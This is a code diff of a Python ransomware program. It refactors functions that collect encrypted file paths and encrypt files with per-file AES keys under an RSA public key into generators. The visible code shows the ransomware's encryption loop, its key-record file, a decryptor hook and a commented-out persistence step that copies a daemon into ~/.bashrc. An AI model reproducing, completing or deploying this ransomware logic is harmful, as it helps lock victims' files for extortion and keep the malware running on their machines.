@@ -45,19 +45,13 @@ with open(ransomware_path + '/client_public_key.PEM', 'r') as f:
 client_public_key_obj = RSA.importKey(client_public_key)
 
 
-
-
 def get_paths():
-    
-    encrypted_files_path = []
-    
     with open(ransomware_path + '/AES_encrypted_keys.txt') as f:
         content = f.read().split("\n")
     
     for aes_and_path in content:
-        encrypted_files_path.append(aes_and_path[1])
+        yield aes_and_path[1]
     
-    return encrypted_files_path
 
 
 def open_decryptor():
@@ -132,7 +126,6 @@ def start_encryption(files):
     if(not files):
         return None
 
-    AES_and_base64_path = []
     for found_file in files:
         key = generate_keys.generate_key(128, True)
         AES_obj = symmetric.AESCipher(key)
@@ -151,10 +144,8 @@ def start_encryption(files):
         base64_new_file_name = base64.b64encode(new_file_name)
 
         # list of tuples of AES_key and base64(path)
-        AES_and_base64_path.append((key, base64_new_file_name))
+        yield (key, base64_new_file_name)
     
-    return AES_and_base64_path
-
 
 def menu():
     # encrypted_files = get_paths()
@@ -176,6 +167,7 @@ def menu():
         aes_keys_and_base64_path = None
         del aes_keys_and_base64_path
         gc.collect()
+
 
 def persist():
     # cp = 'cp ' + ransomware_path + 'daemon ~/.bashrc'
